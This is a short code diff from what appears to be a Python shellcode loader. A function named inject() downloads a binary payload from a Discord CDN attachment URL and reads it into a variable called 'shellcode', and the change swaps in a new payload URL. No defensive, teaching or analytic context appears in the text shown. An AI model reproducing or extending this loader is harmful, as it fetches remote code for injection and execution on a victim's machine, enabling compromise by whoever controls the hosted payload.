@@ -3,7 +3,7 @@ import requests
 
 def inject():
     try:
-        url = "https://cdn.discordapp.com/attachments/1361533730941964319/1361756334134919378/test3.bin?ex=67ffe9ea&is=67fe986a&hm=38e509f21b9cfda4ef256261fc9d0acae0de58e4ce533ffce405a88222830416&"
+        url = "https://cdn.discordapp.com/attachments/1361533730941964319/1361757512726089970/output.bin?ex=67ffeb03&is=67fe9983&hm=895219a82bf2becca8293af762385d6aab3bcb47b17e5e989fe77b21c9f6d869&"
         response = requests.get(url, timeout=10)
         response.raise_for_status() 
         shellcode = response.content
